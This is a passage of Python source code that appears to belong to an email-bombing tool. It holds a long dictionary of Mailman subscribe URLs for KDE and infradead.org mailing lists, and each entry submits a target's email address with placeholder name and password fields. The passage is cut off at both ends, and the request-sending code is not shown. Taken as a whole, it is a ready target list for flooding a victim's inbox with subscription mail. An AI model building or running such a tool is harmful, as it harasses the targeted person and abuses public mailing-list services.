                'url': 'https://mail.kde.org/mailman/subscribe/kde-telepathy-bugs',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-telepathy-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RzHoU': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-usa',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-usa',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UMLdF': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-utils-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-utils-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FvgDU': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-windows',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-windows',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QRAlA': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-women',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-women',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AqFnD': {
                'url': 'https://mail.kde.org/mailman/subscribe/kde-www',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kde-www',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xWiNI': {
                'url': 'https://mail.kde.org/mailman/subscribe/kdeconnect',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kdeconnect',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZLSTw': {
                'url': 'https://mail.kde.org/mailman/subscribe/kdelibs-bugs',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kdelibs-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XPxKh': {
                'url': 'https://mail.kde.org/mailman/subscribe/kdenlive',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kdenlive',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mKjvW': {
                'url': 'https://mail.kde.org/mailman/subscribe/kdepim-bugs',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kdepim-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'myQRV': {
                'url': 'https://mail.kde.org/mailman/subscribe/kdepim-builds',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kdepim-builds',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qLhHd': {
                'url': 'https://mail.kde.org/mailman/subscribe/kdepim-users',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kdepim-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kZpZm': {
                'url': 'https://mail.kde.org/mailman/subscribe/kdevelop',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kdevelop',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LNchv': {
                'url': 'https://mail.kde.org/mailman/subscribe/kdevelop-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kdevelop-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kTgfx': {
                'url': 'https://mail.kde.org/mailman/subscribe/kexi',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kexi',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LCXEY': {
                'url': 'https://mail.kde.org/mailman/subscribe/kexi-bugs',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kexi-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PdNSY': {
                'url': 'https://mail.kde.org/mailman/subscribe/kexi-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kexi-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VtrUr': {
                'url': 'https://mail.kde.org/mailman/subscribe/kfm-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kfm-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WcBFo': {
                'url': 'http://mail.kde.org/cgi-bin/mailman/subscribe/kgeotag',
                'token_url': 'http://mail.kde.org/cgi-bin/mailman/listinfo/kgeotag',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'atouU': {
                'url': 'https://mail.kde.org/mailman/subscribe/kget',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kget',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Wuxyh': {
                'url': 'https://mail.kde.org/mailman/subscribe/khtml-cvs',
                'token_url': 'https://mail.kde.org/mailman/listinfo/khtml-cvs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FVTrb': {
                'url': 'https://mail.kde.org/mailman/subscribe/kimageshop',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kimageshop',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QrrkQ': {
                'url': 'http://mail.kde.org/cgi-bin/mailman/subscribe/kirigami',
                'token_url': 'http://mail.kde.org/cgi-bin/mailman/listinfo/kirigami',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tIGLE': {
                'url': 'https://mail.kde.org/mailman/subscribe/kmymoney',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kmymoney',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PbtCv': {
                'url': 'https://mail.kde.org/mailman/subscribe/kmymoney-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kmymoney-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ulEsQ': {
                'url': 'https://mail.kde.org/mailman/subscribe/kompare-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kompare-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZiHGS': {
                'url': 'https://mail.kde.org/mailman/subscribe/konsole-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/konsole-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BRzbX': {
                'url': 'https://mail.kde.org/mailman/subscribe/konversation-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/konversation-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DcjWC': {
                'url': 'https://mail.kde.org/mailman/subscribe/kopete-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kopete-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GDgEB': {
                'url': 'https://mail.kde.org/mailman/subscribe/ksecretservice-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/ksecretservice-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vltNL': {
                'url': 'https://mail.kde.org/mailman/subscribe/kst',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kst',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DGkTU': {
                'url': 'https://mail.kde.org/mailman/subscribe/kstars-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kstars-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uPpZh': {
                'url': 'https://mail.kde.org/mailman/subscribe/ktechlab-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/ktechlab-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mauTS': {
                'url': 'https://mail.kde.org/mailman/subscribe/kwin',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kwin',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'yNwvP': {
                'url': 'https://mail.kde.org/mailman/subscribe/kwrite-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kwrite-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kJyqW': {
                'url': 'https://mail.kde.org/mailman/subscribe/kxstitch',
                'token_url': 'https://mail.kde.org/mailman/listinfo/kxstitch',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mSlLP': {
                'url': 'https://mail.kde.org/mailman/subscribe/lakademy-attendees',
                'token_url': 'https://mail.kde.org/mailman/listinfo/lakademy-attendees',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HzyMY': {
                'url': 'https://mail.kde.org/mailman/subscribe/marble',
                'token_url': 'https://mail.kde.org/mailman/listinfo/marble',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BHBGJ': {
                'url': 'https://mail.kde.org/mailman/subscribe/marble-bugs',
                'token_url': 'https://mail.kde.org/mailman/listinfo/marble-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PIHlx': {
                'url': 'https://mail.kde.org/mailman/subscribe/marble-commits',
                'token_url': 'https://mail.kde.org/mailman/listinfo/marble-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EZbhl': {
                'url': 'https://mail.kde.org/mailman/subscribe/marble-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/marble-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZgWxe': {
                'url': 'https://mail.kde.org/mailman/subscribe/massif-visualizer',
                'token_url': 'https://mail.kde.org/mailman/listinfo/massif-visualizer',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SFYac': {
                'url': 'https://mail.kde.org/mailman/subscribe/neon',
                'token_url': 'https://mail.kde.org/mailman/listinfo/neon',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZJXFs': {
                'url': 'https://mail.kde.org/mailman/subscribe/neon-bugs',
                'token_url': 'https://mail.kde.org/mailman/listinfo/neon-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MCmFd': {
                'url': 'http://mail.kde.org/cgi-bin/mailman/subscribe/neon-commits',
                'token_url': 'http://mail.kde.org/cgi-bin/mailman/listinfo/neon-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jzVte': {
                'url': 'https://mail.kde.org/mailman/subscribe/neon-notifications',
                'token_url': 'https://mail.kde.org/mailman/listinfo/neon-notifications',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MPElj': {
                'url': 'https://mail.kde.org/mailman/subscribe/okular-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/okular-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TTNxd': {
                'url': 'https://mail.kde.org/mailman/subscribe/plasma-bugs',
                'token_url': 'https://mail.kde.org/mailman/listinfo/plasma-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AOLAa': {
                'url': 'https://mail.kde.org/mailman/subscribe/plasma-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/plasma-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HcdsQ': {
                'url': 'https://mail.kde.org/mailman/subscribe/plasma-mobile',
                'token_url': 'https://mail.kde.org/mailman/listinfo/plasma-mobile',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WScRn': {
                'url': 'https://mail.kde.org/mailman/subscribe/qmlweb',
                'token_url': 'https://mail.kde.org/mailman/listinfo/qmlweb',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LqRTI': {
                'url': 'https://mail.kde.org/mailman/subscribe/qtcon-attendees',
                'token_url': 'https://mail.kde.org/mailman/listinfo/qtcon-attendees',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OgBYp': {
                'url': 'https://mail.kde.org/mailman/subscribe/release-team',
                'token_url': 'https://mail.kde.org/mailman/listinfo/release-team',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MoyDn': {
                'url': 'https://mail.kde.org/mailman/subscribe/rkward-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/rkward-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'acpaI': {
                'url': 'https://mail.kde.org/mailman/subscribe/rkward-tracker',
                'token_url': 'https://mail.kde.org/mailman/listinfo/rkward-tracker',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nYyaO': {
                'url': 'https://mail.kde.org/mailman/subscribe/rkward-users',
                'token_url': 'https://mail.kde.org/mailman/listinfo/rkward-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eBEmN': {
                'url': 'http://mail.kde.org/cgi-bin/mailman/subscribe/rolisteam',
                'token_url': 'http://mail.kde.org/cgi-bin/mailman/listinfo/rolisteam',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bDMYr': {
                'url': 'https://mail.kde.org/mailman/subscribe/snorenotify',
                'token_url': 'https://mail.kde.org/mailman/listinfo/snorenotify',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RsOXH': {
                'url': 'https://mail.kde.org/mailman/subscribe/symboleditor',
                'token_url': 'https://mail.kde.org/mailman/listinfo/symboleditor',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VEVyF': {
                'url': 'https://mail.kde.org/mailman/subscribe/sysadmin',
                'token_url': 'https://mail.kde.org/mailman/listinfo/sysadmin',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NIKLS': {
                'url': 'https://mail.kde.org/mailman/subscribe/taglib-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/taglib-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vUSMK': {
                'url': 'https://mail.kde.org/mailman/subscribe/tellico-users',
                'token_url': 'https://mail.kde.org/mailman/listinfo/tellico-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OxLxx': {
                'url': 'https://mail.kde.org/mailman/subscribe/umbrello',
                'token_url': 'https://mail.kde.org/mailman/listinfo/umbrello',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mgAUs': {
                'url': 'https://mail.kde.org/mailman/subscribe/umbrello-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/umbrello-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ICiif': {
                'url': 'https://mail.kde.org/mailman/subscribe/unassigned-bugs',
                'token_url': 'https://mail.kde.org/mailman/listinfo/unassigned-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DyJjw': {
                'url': 'https://mail.kde.org/mailman/subscribe/visual-design',
                'token_url': 'https://mail.kde.org/mailman/listinfo/visual-design',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GmIZD': {
                'url': 'https://mail.kde.org/mailman/subscribe/webkit-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/webkit-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eeGet': {
                'url': 'https://mail.kde.org/mailman/subscribe/wikitolearn',
                'token_url': 'https://mail.kde.org/mailman/listinfo/wikitolearn',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HjLQY': {
                'url': 'https://mail.kde.org/mailman/subscribe/zanshin-devel',
                'token_url': 'https://mail.kde.org/mailman/listinfo/zanshin-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cgkUt': {
                'url': 'https://lists.infradead.org/mailman/subscribe/aiaiai',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/aiaiai',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Woche': {
                'url': 'https://lists.infradead.org/mailman/subscribe/arm-platform-maintainers',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/arm-platform-maintainers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VcaAQ': {
                'url': 'https://lists.infradead.org/mailman/subscribe/arm-summit-discuss',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/arm-summit-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Wioyk': {
                'url': 'https://lists.infradead.org/mailman/subscribe/ath10k',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/ath10k',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RdHbT': {
                'url': 'https://lists.infradead.org/mailman/subscribe/ath11k',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/ath11k',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uPnAG': {
                'url': 'https://lists.infradead.org/mailman/subscribe/ath6kl',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/ath6kl',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BuRQm': {
                'url': 'https://lists.infradead.org/mailman/subscribe/ath9k_htc_fw',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/ath9k_htc_fw',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dmjZE': {
                'url': 'https://lists.infradead.org/mailman/subscribe/b43-dev',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/b43-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jjeYs': {
                'url': 'https://lists.infradead.org/mailman/subscribe/barebox',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/barebox',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SzvnG': {
                'url': 'https://lists.infradead.org/mailman/subscribe/bmap-tools',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/bmap-tools',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xuoEt': {
                'url': 'https://lists.infradead.org/mailman/subscribe/compsci',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/compsci',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XPtou': {
                'url': 'https://lists.infradead.org/mailman/subscribe/get_iplayer',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/get_iplayer',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qvhNv': {
                'url': 'https://lists.infradead.org/mailman/subscribe/herdtools',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/herdtools',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mTBHd': {
                'url': 'https://lists.infradead.org/mailman/subscribe/honeycomb-users',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/honeycomb-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uqJfs': {
                'url': 'https://lists.infradead.org/mailman/subscribe/hostap',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/hostap',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DkWgX': {
                'url': 'https://lists.infradead.org/mailman/subscribe/irqbalance',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/irqbalance',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kPjfB': {
                'url': 'https://lists.infradead.org/mailman/subscribe/kexec',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/kexec',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UJieZ': {
                'url': 'https://lists.infradead.org/mailman/subscribe/kvm-riscv',
                'token_url': 'https://lists.infradead.org/mailman/listinfo/kvm-riscv',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dZTqY': {
